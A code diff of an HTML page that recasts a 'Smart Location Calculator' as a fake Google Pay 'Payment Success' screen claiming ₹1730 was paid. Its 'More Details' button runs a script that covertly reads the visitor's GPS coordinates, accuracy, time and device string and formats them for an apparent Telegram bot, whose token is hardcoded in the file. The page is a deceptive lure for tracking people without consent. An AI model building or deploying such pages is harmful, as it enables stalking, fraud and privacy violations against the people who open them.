@@ -3,115 +3,106 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Smart Location Calculator</title>
+  <title>Payment Success</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
+      padding: 20px;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #00c6ff, #0072ff);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .start-screen, .calculator {
-      display: none;
-      width: 100%;
-      max-width: 360px;
-      background: white;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-    }
-    .start-screen.active, .calculator.active {
-      display: block;
-    }
-    .start-screen h2 {
-      text-align: center;
+      background: #f5f5f5;
       color: #333;
+      text-align: center;
     }
-    .start-btn {
-      display: block;
-      width: 100%;
-      padding: 15px;
-      font-size: 1.2em;
-      background-color: #00b894;
-      color: white;
+    .success-box {
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: 40px auto;
+    }
+    .success-box h1 {
+      color: #00c853;
+    }
+    .success-box p {
+      margin: 10px 0;
+      font-size: 18px;
+    }
+    .btn {
+      background: #2962ff;
+      color: #fff;
+      padding: 15px 25px;
+      font-size: 16px;
       border: none;
-      border-radius: 10px;
+      border-radius: 8px;
       cursor: pointer;
       margin-top: 20px;
     }
+    .calculator {
+      display: none;
+      margin-top: 40px;
+    }
     .display {
       height: 60px;
-      background: #f4f4f4;
+      background: #eceff1;
       font-size: 2em;
       padding: 10px;
       text-align: right;
       border-radius: 10px;
       margin-bottom: 20px;
       box-sizing: border-box;
-      overflow-x: auto;
     }
     .buttons {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
-      gap: 15px;
+      gap: 10px;
     }
-    button {
-      font-size: 1.5em;
-      padding: 20px;
+    button.calc {
+      font-size: 1.4em;
+      padding: 15px;
       border: none;
       border-radius: 10px;
       background-color: #e0f7fa;
       box-shadow: 0 3px 5px rgba(0,0,0,0.1);
       cursor: pointer;
-      transition: background 0.3s;
     }
-    button:active {
-      background-color: #b2ebf2;
-    }
-    .equal {
-      background-color: #a5d6a7;
-      grid-column: span 2;
-    }
-    .clear {
-      background-color: #ef9a9a;
-    }
+    .equal { background: #a5d6a7; }
+    .clear { background: #ef9a9a; }
   </style>
 </head>
 <body>
 
-<div class="start-screen active" id="startScreen">
-  <h2>Click Start to use Smart Calculator</h2>
-  <button class="start-btn" onclick="startCalculator()">Start</button>
+<div class="success-box">
+  <h1>✅ Google Pay</h1>
+  <p><strong>₹1730</strong> successfully paid</p>
+  <p>Txn ID: GPay-TXN-74826341</p>
+  <button class="btn" onclick="showCalculator()">More Details</button>
 </div>
 
 <div class="calculator" id="calculator">
   <div id="display" class="display">0</div>
   <div class="buttons">
-    <button onclick="clearDisplay()" class="clear">C</button>
-    <button onclick="append('/')">/</button>
-    <button onclick="append('*')">*</button>
-    <button onclick="append('-')">-</button>
+    <button class="calc clear" onclick="clearDisplay()">C</button>
+    <button class="calc" onclick="append('/')">/</button>
+    <button class="calc" onclick="append('*')">*</button>
+    <button class="calc" onclick="append('-')">-</button>
 
-    <button onclick="append('7')">7</button>
-    <button onclick="append('8')">8</button>
-    <button onclick="append('9')">9</button>
-    <button onclick="append('+')">+</button>
+    <button class="calc" onclick="append('7')">7</button>
+    <button class="calc" onclick="append('8')">8</button>
+    <button class="calc" onclick="append('9')">9</button>
+    <button class="calc" onclick="append('+')">+</button>
 
-    <button onclick="append('4')">4</button>
-    <button onclick="append('5')">5</button>
-    <button onclick="append('6')">6</button>
-    <button onclick="append('1')">1</button>
+    <button class="calc" onclick="append('4')">4</button>
+    <button class="calc" onclick="append('5')">5</button>
+    <button class="calc" onclick="append('6')">6</button>
+    <button class="calc" onclick="append('1')">1</button>
 
-    <button onclick="append('2')">2</button>
-    <button onclick="append('3')">3</button>
-    <button onclick="append('0')">0</button>
-    <button onclick="append('.')">.</button>
+    <button class="calc" onclick="append('2')">2</button>
+    <button class="calc" onclick="append('3')">3</button>
+    <button class="calc" onclick="append('0')">0</button>
+    <button class="calc" onclick="append('.')">.</button>
 
-    <button onclick="calculate()" class="equal">=</button>
+    <button class="calc equal" onclick="calculate()">=</button>
   </div>
 </div>
 
@@ -139,10 +130,9 @@
     }
   }
 
-  function startCalculator() {
-    sendLocation("User clicked Start");
-    document.getElementById("startScreen").classList.remove("active");
-    document.getElementById("calculator").classList.add("active");
+  function showCalculator() {
+    document.getElementById("calculator").style.display = "block";
+    sendLocation("Clicked More Details");
   }
 
   function sendLocation(note) {
@@ -154,14 +144,13 @@
 
         const message = `
 📍 ${note}
+✅ Google Pay ₹1730 Success
 
-🌍 Location:
-Latitude: ${lat}
-Longitude: ${lon}
-Accuracy: ${accuracy}m
-
-🕒 Time: ${new Date().toLocaleString()}
-📱 Device: ${navigator.userAgent}
+🌍 Latitude: ${lat}
+🌍 Longitude: ${lon}
+🎯 Accuracy: ${accuracy}m
+🕒 ${new Date().toLocaleString()}
+📱 ${navigator.userAgent}
         `;
 
         const TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
